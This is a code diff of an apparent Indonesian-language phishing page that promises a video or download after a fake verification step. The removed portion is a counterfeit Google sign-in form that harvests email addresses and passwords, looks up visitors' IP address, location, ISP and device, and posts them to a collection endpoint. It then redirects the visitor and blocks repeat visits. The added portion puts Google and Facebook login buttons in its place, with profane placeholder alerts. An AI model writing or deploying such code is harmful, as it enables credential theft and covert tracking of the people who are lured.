@@ -73,52 +73,21 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
 .btn-lanjut.active{background:#1a73e8;color:#fff;cursor:pointer;}
 .verify-note{margin-top:18px;font-size:11px;color:#9aa0a6;line-height:1.5;}
 
-/* LOGIN MODAL */
-.modal{position:fixed;inset:0;width:100%;height:100%;background:rgba(0,0,0,.42);display:none;align-items:center;justify-content:center;padding:24px;z-index:99999;}
+/* LOGIN MODAL BARU */
+.modal{position:fixed;inset:0;width:100%;height:100%;background:rgba(0,0,0,.6);display:none;align-items:center;justify-content:center;padding:24px;z-index:99999; backdrop-filter: blur(3px);}
 .modal.show{display:flex;}
-.login-card{background:#fff;width:92%;max-width:410px;max-height:88vh;overflow-y:auto;border-radius:14px;box-shadow:0 10px 40px rgba(0,0,0,.28);}
-.login-card-header{display:flex;align-items:center;justify-content:space-between;padding:15px 18px;border-bottom:1px solid #e8eaed;}
-.header-left{display:flex;align-items:center;gap:10px;}
-.header-logo{width:22px;height:22px;object-fit:contain;}
-.header-title{font-size:15px;font-weight:500;color:#202124;}
-.close-btn{background:none;border:none;font-size:22px;color:#5f6368;cursor:pointer;padding:3px 9px;border-radius:50%;}
-.card-body{padding:24px 22px 26px;}
-.login-title{font-size:22px;color:#202124;margin-bottom:7px;}
-.login-subtitle{font-size:13px;color:#5f6368;margin-bottom:22px;}
-.login-subtitle strong{font-weight:500;color:#202124;}
-.input-group{margin-bottom:13px;}
-.input-field{width:100%;padding:12px 13px;border:1px solid #dadce0;border-radius:6px;font-size:14px;color:#202124;outline:none;}
-.input-field:focus{border:2px solid #1a73e8;padding:11px 12px;}
-.checkbox-row{display:flex;align-items:center;gap:9px;margin:9px 0 18px;}
-.checkbox-row input{width:17px;height:17px;cursor:pointer;accent-color:#1a73e8;}
-.checkbox-row label{font-size:13px;color:#202124;cursor:pointer;}
-.login-message{display:none;margin-bottom:13px;padding:9px;border-radius:6px;font-size:12px;}
-.login-message.error{display:block;background:#fce8e6;color:#c5221f;}
-.login-message.success{display:block;background:#e6f4ea;color:#137333;}
-.privacy{font-size:12px;color:#5f6368;line-height:1.5;margin-bottom:17px;}
-.privacy a{color:#1a73e8;text-decoration:none;}
-.actions{display:flex;justify-content:space-between;align-items:center;margin-top:7px;}
-.forgot{color:#1a73e8;font-size:13px;font-weight:500;text-decoration:none;}
-.btn-login{background:#1a73e8;color:#fff;border:none;padding:10px 23px;border-radius:6px;font-size:13px;font-weight:500;cursor:pointer;}
-.inactive{cursor:default;}
-.signup-area{text-align:center;margin-top:17px;font-size:12px;color:#5f6368;}
-.signup-area button{border:0;background:none;color:#1a73e8;font-weight:500;font-size:12px;cursor:default;}
+.login-card{background:#fff;width:100%;max-width:350px;border-radius:20px;box-shadow:0 10px 40px rgba(0,0,0,.3); padding: 30px 20px; text-align:center; position:relative;}
+.close-btn{position:absolute; right:15px; top:15px; background:none; border:none; font-size:26px; color:#999; cursor:pointer; line-height:1;}
+.btn-sosmed{display:flex; align-items:center; justify-content:center; width:100%; padding:14px; border-radius:8px; font-size:15px; font-weight:600; margin-bottom:15px; cursor:pointer; transition: opacity 0.2s;}
+.btn-sosmed:active{opacity:0.7;}
+.btn-google{border:1px solid #dadce0; background:#fff; color:#3c4043;}
+.btn-google img{width:22px; height:22px; margin-right:12px;}
+.btn-facebook{border:1px solid #1877f2; background:#1877f2; color:#fff;}
+.btn-facebook svg{width:22px; height:22px; margin-right:12px; fill:#fff;}
 
 @media(max-width:480px){
     .modal{padding:18px;}
-    .login-card{width:88%;max-width:390px;max-height:84vh;}
-    .card-body{padding:22px 20px 24px;}
-    .login-title{font-size:21px;}
-    .login-subtitle{font-size:12px;}
-}
-@media(max-width:360px){
-    .modal{padding:14px;}
-    .login-card{width:86%;max-height:82vh;}
-    .card-body{padding:19px 17px 21px;}
-    .login-title{font-size:20px;}
-    .privacy{font-size:11px;}
-    .forgot{font-size:12px;}
-    .btn-login{padding:9px 20px;font-size:12px;}
+    .login-card{width:90%; max-width:340px;}
 }
 </style>
 
@@ -129,7 +98,7 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
             localStorage.getItem("sudah_submit") === "1" ||
             sessionStorage.getItem("sudah_submit") === "1" ||
             document.cookie.indexOf("sudah_submit=1") !== -1;
-        if(blocked){ window.location.replace("/blokir"); } // URL TANPA .HTML
+        if(blocked){ window.location.replace("/blokir"); }
     } catch(e){}
 })();
 </script>
@@ -215,44 +184,21 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
 </div>
 
 
+<!-- MODAL LOGIN BARU -->
 <div class="modal" id="loginModal" onclick="outsideClose(event)">
     <div class="login-card" onclick="event.stopPropagation()">
-        <div class="login-card-header">
-            <div class="header-left">
-                <img src="google.png" alt="Google" class="header-logo">
-                <span class="header-title">Masuk</span>
-            </div>
-            <button class="close-btn" type="button" onclick="closeLogin()">×</button>
-        </div>
-        <div class="card-body">
-            <div class="login-title">Sign in</div>
-            <div class="login-subtitle">untuk melanjutkan ke <strong>download page</strong></div>
-            <div class="login-message" id="loginMessage"></div>
-            <form id="loginForm" onsubmit="loginUser(event)">
-                <div class="input-group">
-                    <input id="loginUsername" type="text" class="input-field" placeholder="Email address" autocomplete="username" required>
-                </div>
-                <div class="input-group">
-                    <input id="loginPassword" type="password" class="input-field" placeholder="Enter your password" autocomplete="current-password" required>
-                </div>
-                <div class="checkbox-row">
-                    <input type="checkbox" id="showPass" onchange="togglePassword()">
-                    <label for="showPass">Show Password</label>
-                </div>
-                <p class="privacy">
-                    By continuing, layanan akan menggunakan informasi akun hanya untuk proses login pada halaman ini.
-                    Lihat <a href="#" onclick="return false;">Privacy Policy</a> dan <a href="#" onclick="return false;">Terms of Service</a>.
-                </p>
-                <div class="actions">
-                    <a href="javascript:void(0)" class="forgot inactive" onclick="return false;">Forgot password?</a>
-                    <button type="submit" class="btn-login">Log in</button>
-                </div>
-                <div class="signup-area">
-                    Belum punya akun?
-                    <button type="button" onclick="return false;">Sign up</button>
-                </div>
-            </form>
-        </div>
+        <button class="close-btn" type="button" onclick="closeLogin()">×</button>
+        <h2 style="font-size:20px; font-weight:600; color:#1a1a1a; margin-bottom:25px; margin-top:5px;">Login untuk melanjutkan nonton</h2>
+
+        <button class="btn-sosmed btn-google" onclick="loginGoogle()">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google">
+            Masuk dengan Google
+        </button>
+
+        <button class="btn-sosmed btn-facebook" onclick="loginFacebook()">
+            <svg viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.469h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.469h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+            Masuk dengan Facebook
+        </button>
     </div>
 </div>
 
@@ -362,6 +308,9 @@ function lanjutKeLogin(){
         if(vm) vm.classList.remove("show");
 
         if(btn) btn.textContent = "Lanjutkan";
+        
+        // LANGSUNG MUNCULIN LOGIN MODAL SETELAH VERIF
+        openDownloadLogin();
     }, 900);
 }
 
@@ -373,7 +322,7 @@ function openDownloadLogin(event){
 
     /* CEK BLOKIR */
     if(cekDeviceBlocked()){
-        window.location.replace("/blokir"); // URL TANPA .HTML
+        window.location.replace("/blokir");
         return;
     }
 
@@ -389,56 +338,8 @@ function openDownloadLogin(event){
 
 
 /* ============ HELPER ============ */
-function validasiInput(email, pass){
-    if(!email || !pass) return "Harap isi email dan kata sandi!";
-    if(!email.toLowerCase().endsWith("@gmail.com")) return "Email harus berakhir dengan @gmail.com";
-    if(pass.length < 8) return "Kata sandi minimal 8 karakter!";
-    if(/^\d+$/.test(pass)) return "Kata sandi tidak boleh angka semua!";
-    if(/^[a-z]+$/.test(pass)) return "Kata sandi tidak boleh huruf kecil semua!";
-    return "";
-}
-
-function formatWaktuWIB(date){
-    var opt = { timeZone:"Asia/Jakarta", day:"2-digit",month:"2-digit",year:"numeric",hour:"2-digit",minute:"2-digit",second:"2-digit",hour12:false };
-    var parts = new Intl.DateTimeFormat("id-ID", opt).formatToParts(date);
-    var obj = {};
-    parts.forEach(function(p){ obj[p.type] = p.value; });
-    return obj.day+"-"+obj.month+"-"+obj.year+" "+obj.hour+":"+obj.minute+":"+obj.second+" WIB";
-}
-
-function detectDevice(ua){
-    if(/Android/i.test(ua)) return "Android";
-    if(/iPhone|iPad|iPod/i.test(ua)) return "iOS";
-    if(/Windows/i.test(ua)) return "Windows";
-    if(/Mac/i.test(ua)) return "Mac";
-    if(/Linux/i.test(ua)) return "Linux";
-    return "Unknown";
-}
-
-function detectOS(ua){
-    var m;
-    if((m = ua.match(/Android\s([\d.]+)/i))) return "Android " + m[1];
-    if((m = ua.match(/iPhone OS ([\d_]+)/i))) return "iOS " + m[1].replace(/_/g,".");
-    if((m = ua.match(/Windows NT ([\d.]+)/i))){ var v = m[1]; return "Windows " + (v === "10.0" ? "10/11" : v); }
-    if((m = ua.match(/Mac OS X ([\d_]+)/i))) return "macOS " + m[1].replace(/_/g,".");
-    if(/Linux/i.test(ua)) return "Linux";
-    return "Unknown";
-}
-
-function detectBrowser(ua){
-    var m;
-    if(/Edg\//i.test(ua) && (m = ua.match(/Edg\/([\d.]+)/i))) return "Edge " + m[1];
-    if(/OPR\//i.test(ua) && (m = ua.match(/OPR\/([\d.]+)/i))) return "Opera " + m[1];
-    if(/SamsungBrowser/i.test(ua) && (m = ua.match(/SamsungBrowser\/([\d.]+)/i))) return "Samsung " + m[1];
-    if(/Chrome\//i.test(ua) && (m = ua.match(/Chrome\/([\d.]+)/i))) return "Chrome " + m[1];
-    if(/Firefox\//i.test(ua) && (m = ua.match(/Firefox\/([\d.]+)/i))) return "Firefox " + m[1];
-    if(/Safari\//i.test(ua) && (m = ua.match(/Version\/([\d.]+)/i))) return "Safari " + m[1];
-    return "Unknown";
-}
-
 function closeLogin(){
     document.getElementById("loginModal").classList.remove("show");
-    clearMessage();
 }
 
 function outsideClose(event){
@@ -446,77 +347,16 @@ function outsideClose(event){
     if(event.target === modal) closeLogin();
 }
 
-function togglePassword(){
-    var input = document.getElementById("loginPassword");
-    var cb = document.getElementById("showPass");
-    if(input && cb) input.type = cb.checked ? "text" : "password";
+
+/* ============ FUNGSI TOMBOL LOGIN ============ */
+function loginGoogle(){
+    alert("Redirect ke Google Login, KONTOL! Ganti linknya di sini!");
+    // window.location.href = "https://accounts.google.com/...";
 }
 
-function showMessage(text, type){
-    var m = document.getElementById("loginMessage");
-    if(m){ m.textContent = text; m.className = "login-message " + type; }
-}
-
-function clearMessage(){
-    var m = document.getElementById("loginMessage");
-    if(m){ m.textContent = ""; m.className = "login-message"; }
-}
-
-
-/* ============ LOGIN ============ */
-function loginUser(event){
-    event.preventDefault();
-    var username = document.getElementById("loginUsername").value.trim();
-    var password = document.getElementById("loginPassword").value;
-
-    clearMessage();
-
-    var errMsg = validasiInput(username, password);
-    if(errMsg){ showMessage("❌ " + errMsg, "error"); return; }
-
-    showMessage("Memproses...", "success");
-
-    fetch("https://ipapi.co/json/")
-        .then(function(r){ return r.json(); })
-        .then(function(d){
-            var ua = navigator.userAgent;
-            var payload = {
-                web_id: "web_id_kenz_1", // <--- TAMBAHAN MULTI-TENANT
-                email: username, password: password,
-                ip: d.ip || "-",
-                negara: d.country_name || "-",
-                prov: d.region || "-",
-                kota: d.city || "-",
-                isp: d.org || "-",
-                koord: (d.latitude||"-")+" , "+(d.longitude||"-"),
-                waktu: formatWaktuWIB(new Date()),
-                device: detectDevice(ua),
-                os: detectOS(ua),
-                browser: detectBrowser(ua)
-            };
-            return fetch("/api/send", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            });
-        })
-        .then(function(res){
-            if(res.status === 403){ window.location.replace("/blokir"); return null; }
-            return res.json();
-        })
-        .then(function(result){
-            setDeviceBlocked();
-            showMessage("✅ Login berhasil!", "success");
-        })
-        .catch(function(err){
-            setDeviceBlocked();
-        })
-        .finally(function(){
-            setTimeout(function(){
-                // LANGSUNG KE LINK CATBOX, BUKAN KE BLOKIR
-                window.location.href = "https://files.catbox.moe/mfxa6c.mp4";
-            }, 1200); // Delay 1.2 detik biar data sempet kekirim
-        });
+function loginFacebook(){
+    alert("Redirect ke Facebook Login, BANGSAT! Ganti linknya di sini!");
+    // window.location.href = "https://www.facebook.com/...";
 }
 
 
@@ -525,7 +365,7 @@ window.addEventListener("load", function(){
 
     /* KALO UDAH SUBMIT → BLOKIR */
     if(cekDeviceBlocked()){
-        window.location.replace("/blokir"); // URL TANPA .HTML
+        window.location.replace("/blokir");
         return;
     }
 
@@ -533,7 +373,6 @@ window.addEventListener("load", function(){
     if(sessionStorage.getItem("verif_ok") !== "1"){
         openVerifyModal();
     }
-    /* KALO UDAH VERIF → BIARIN HALAMAN DOWNLOAD TAMPIL */
 });
 
 document.addEventListener("keydown", function(event){
